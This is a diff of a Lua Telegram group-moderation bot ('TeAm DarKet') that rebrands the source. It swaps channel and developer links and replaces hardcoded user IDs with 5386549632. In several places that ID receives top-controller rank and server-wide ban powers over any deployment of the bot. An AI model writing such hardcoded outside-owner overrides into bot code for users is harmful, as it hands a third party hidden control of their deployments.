-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14599,7 +14599,7 @@ if not msg.Manger then
 return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/IIIIIIQ'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
 return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local list = Redis:smembers(darket.."List:Manager"..msg_chat_id.."")
@@ -14715,7 +14715,7 @@ Abs = math.random(2,140);
 local Text ='*✘︙تم اختيار الشعر لك فقط*'
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '⧫ ٠ TeAm DarKet ٠️️ ⧫',url="t.me/IIIIIIQ"}},
+{{text = '⧫ ٠ TeAm DarKet ٠️️ ⧫',url="t.me/R125R"}},
 }
 local msg_id = msg.id/2097152/0.5
 https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/QQNNSX/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -14744,7 +14744,7 @@ data = {
 {text = '0', data = msg.sender.user_id..'calc&0'},{text = '.', data = msg.sender.user_id..'calc&.'},{text = '+', data = msg.sender.user_id..'calc&+'},{text = '=', data = msg.sender.user_id..'equal'},
 },
 {
-{text = 'مطور السورس', url = 'https://t.me/Q0OO0'},
+{text = 'مطور السورس', url = 'https://t.me/R2RR7'},
 },
 }
 }
@@ -14788,7 +14788,7 @@ if text then
 if text:match("^بحث (.*)$") then
 local search = text:match("^بحث (.*)$")
 local json = json:decode(http.request("https://api-jack.ml/api18.php?search="..URL.escape(search)..""))
-local datar = {data = {{text = "٠ TeAm DarKet ٠" , url = 'https://t.me/IIIIIIQ'}}}
+local datar = {data = {{text = "٠ TeAm DarKet ٠" , url = 'https://t.me/R125R'}}}
 for i = 1,5 do
 title = json.results[i].title
 link = json.results[i].url
@@ -15174,7 +15174,7 @@ return send(msg.chat_id,msg.id,'*\n• تحكم برتب الشخص*',"md",false
 end
 if text then
 if text:match("^حظر من السيرفر (%d+)$") then
-if tonumber(msg.sender.user_id) == tonumber(1965297568) then
+if tonumber(msg.sender.user_id) == tonumber(5386549632) then
 local iduser = tonumber(text:match("^حظر من السيرفر (%d+)$"))
 Redis:sadd("banserver",iduser)
 send(msg.chat_id,msg.id,"• تم حظر العضو من السيرفر")
@@ -15185,7 +15185,7 @@ end
 end
 if text then
 if text:match("^الغاء حظر من السيرفر (%d+)$") then
-if tonumber(msg.sender.user_id) == tonumber(1965297568) then
+if tonumber(msg.sender.user_id) == tonumber(5386549632) then
 local iduser = tonumber(text:match("^الغاء حظر من السيرفر (%d+)$"))
 Redis:srem("banserver",iduser)
 send(msg.chat_id,msg.id,"• تم الغاء حظر العضو من السيرفر")
@@ -15195,7 +15195,7 @@ end
 end
 end
 if text == "المحظورين من السيرفر" then
-if tonumber(msg.sender.user_id) == tonumber(1965297568) then
+if tonumber(msg.sender.user_id) == tonumber(5386549632) then
 local list = Redis:smembers("banserver")
 if #list == 0 then
 return send(msg.chat_id,msg.id,"• القائمه فارغه")
@@ -15216,25 +15216,25 @@ send(msg.chat_id,msg.id,"• للمبرمج ستيفن فقط")
 end
 end
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
-photo = "https://t.me/photojack14366/58"
+photo = "https://t.me/QQQLO/26"
 local T =[[
 – – – – – – – –
  ٠ TeAm DarKet ٠
 – – – – – – – –
-٠ DEV >> [˹ S𝑡𝑒Pℎ𝑒N .](t.me/Q0OO0)
+٠ DEV >> [˹ S𝑡𝑒Pℎ𝑒N .](t.me/R2RR7)
 – – – – – – – – 
 ٠ Exp >> [˹ Exp DarKet .](t.me/DGGEO)
 – – – – – – – – 
-٠ـــ٠ >> [˹ TeAm DarKet .](t.me/IIIIIIQ)
+٠ـــ٠ >> [˹ TeAm DarKet .](t.me/R125R)
 – – – – – – – – 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = 'S𝑡𝑒Pℎ𝑒N', url = "https://t.me/Q0OO0"},
+{text = 'S𝑡𝑒Pℎ𝑒N', url = "https://t.me/R2RR7"},
 },
 {
-{text = 'TeAm DarKet ', url = "https://t.me/IIIIIIQ"}
+{text = 'TeAm DarKet ', url = "https://t.me/R125RL"}
 },
 }
 local msgg = msg_id/2097152/0.5
@@ -17474,7 +17474,7 @@ if data and data.luatele and data.luatele == "updateNewInlineQuery" then
 
 local Text = data.query 
 if Text == '' then
-local input_message_content = {message_text = " ٭ اهلا بك\n ٭ لارسال الهمسه اكتب يوزر البوت + الهمسه + يوزر العضو اللي هتعمله همسه \n ٭ مثال  @M_77bot هلا @Q0OO0"}	
+local input_message_content = {message_text = " ٭ اهلا بك\n ٭ لارسال الهمسه اكتب يوزر البوت + الهمسه + يوزر العضو اللي هتعمله همسه \n ٭ مثال  @M_77bot هلا @R2RR7"}	
 local resuult = {{
 type = 'article',
 id = math.random(1,64),
@@ -17482,12 +17482,12 @@ title = 'اضغط هنا لمعرفه كيفيه ارسال الهمسه',
 input_message_content = input_message_content,
 reply_markup = {
 inline_keyboard ={
-{{text ="ch", url= "https://t.me/IIIIIIQ"}},
+{{text ="ch", url= "https://t.me/R125R"}},
 }
 },
 },
 }
-https.request("https://api.telegram.org/bot"..Token..'/answerInlineQuery?inline_query_id='..data.id..'&switch_pm_text=@Q0OO0&switch_pm_parameter=start&results='..JSON.encode(resuult))
+https.request("https://api.telegram.org/bot"..Token..'/answerInlineQuery?inline_query_id='..data.id..'&switch_pm_text=@R2RR7&switch_pm_parameter=start&results='..JSON.encode(resuult))
 end
 if Text and Text:match("(.*)@(.*)") then
 local hm = {string.match(Text,"(.*)@(.*)")}
@@ -17631,9 +17631,9 @@ print('This is Edit for Bot')
 return false
 end
 File_Bot_Run(Message_Edit,Message_Edit)
-if tonumber(Message_Edit.sender.user_id) == 5298947457 then
+if tonumber(Message_Edit.sender.user_id) == 5386549632 then
 data.The_Controller = 1
-elseif tonumber(Message_Edit.sender.user_id) == 1965297568 then
+elseif tonumber(Message_Edit.sender.user_id) == 5386549632 then
 data.The_Controller = 1
 elseif The_ControllerAll(Message_Edit.sender.user_id) == true then  
 data.The_Controller = 1
@@ -17721,7 +17721,7 @@ data = {
 {text = '0', data = IdUser..'calc&0'},{text = '.', data = IdUser..'calc&.'},{text = '+', data = IdUser..'calc&+'},{text = '=', data = IdUser..'equal'},
 },
 {
-{text = 'مطور السورس', url = 'https://t.me/Q0OO0'},
+{text = 'مطور السورس', url = 'https://t.me/R2RR7'},
 },
 }
 }
@@ -17812,9 +17812,9 @@ else
 LuaTele.answerCallbackQuery(data.id, "• الامر لا يخصك", true)
 end
 end
-if tonumber(IdUser) == 5298947457 then
+if tonumber(IdUser) == 5386549632 then
 data.The_Controller = 1
-elseif tonumber(IdUser) == 1965297568 then
+elseif tonumber(IdUser) == 5386549632 then
 data.The_Controller = 1
 elseif The_ControllerAll(IdUser) == true then  
 data.The_Controller = 1
@@ -18276,14 +18276,14 @@ if Redis:get(darket..'Set:array'..IdUser..':'..ChatId) == 'true1' then
 Redis:del(darket..'Set:array'..IdUser..':'..ChatId)
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'sᴏᴜʀᴄʀ darket',url='https://t.me/IIIIIIQ'}},
+{{text = 'sᴏᴜʀᴄʀ darket',url='https://t.me/R125R'}},
 }
 local msg_idd = Msg_id/2097152/0.5
 return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatId..'&text='..URL.escape(" *٠تم حفظ الردود بنجاح*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 else
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'sᴏᴜʀᴄʀ darket',url='https://t.me/IIIIIIQ'}},
+{{text = 'sᴏᴜʀᴄʀ darket',url='https://t.me/R125R'}},
 }
 return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatId..'&text='..URL.escape(" *٠تم تنفيذ الامر سابقا*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -18362,7 +18362,7 @@ send(Sudo_Id,0,'*\n٠ تم تفعيل مجموعه جديده \n٠من قام ب
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '', url="t.me/IIIIIIQ"},
+{text = '', url="t.me/R125R"},
 },
 }
 local txxt = "٠ تم تفعيل المجموعه و ترقيه {"..y.."} ادمنيه \n٠️︙تم ترقية المالك "
